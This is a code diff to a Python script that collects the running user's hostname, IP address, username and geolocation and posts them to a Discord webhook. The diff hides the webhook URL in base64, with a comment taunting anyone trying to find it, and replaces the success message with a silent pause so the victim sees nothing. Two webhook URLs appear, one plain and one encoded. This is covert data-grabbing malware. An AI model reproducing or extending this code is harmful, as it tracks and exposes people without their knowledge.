@@ -6,8 +6,11 @@ import json
 import getpass
 from threading import Thread, Lock, current_thread
 import socket
+import base64
 
-
+# Try finding this webhook skerm fucking skids
+base64_encoded_webhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5MDUyODE3ODExMzYwOTczOS9kd1ZQbDladUk0RTFBMy1jZ2VfLVZfdjhwSVNyWldaTDliYWVqaVRDNHpUYXR3NV9paGFMYzBkdDNwR3oyMXRLd2tLVw=='
+decoded_webhook = base64.b64decode(base64_encoded_webhook).decode('utf-8')
 hostname = socket.gethostname()
 ip_address = socket.gethostbyname(hostname)
 username = getpass.getuser()
@@ -22,12 +25,10 @@ message = {
     "content": f"**IP Address:** {ip_address}\n**Location:** {location['city']}, {location['regionName']}, {location['country']}"
 }
 
-# Send webhook message
-webhook_url = "https://discord.com/api/webhooks/1090526052046078065/gLo8DAB09qWu_e_j3LwbgcUuMCRedmxylzVeN4pKvKbmwlKyL5R0FBYrGQui8h1-d14F"
+webhook_url = decoded_webhook
 response = requests.post(webhook_url, json=message)
-
 if response.status_code == 204:
-    print("Webhook message sent successfully!")
+    time.sleep(1)
 else:
     print(f"Critical error: {response.status_code}")
     time.sleep(2)
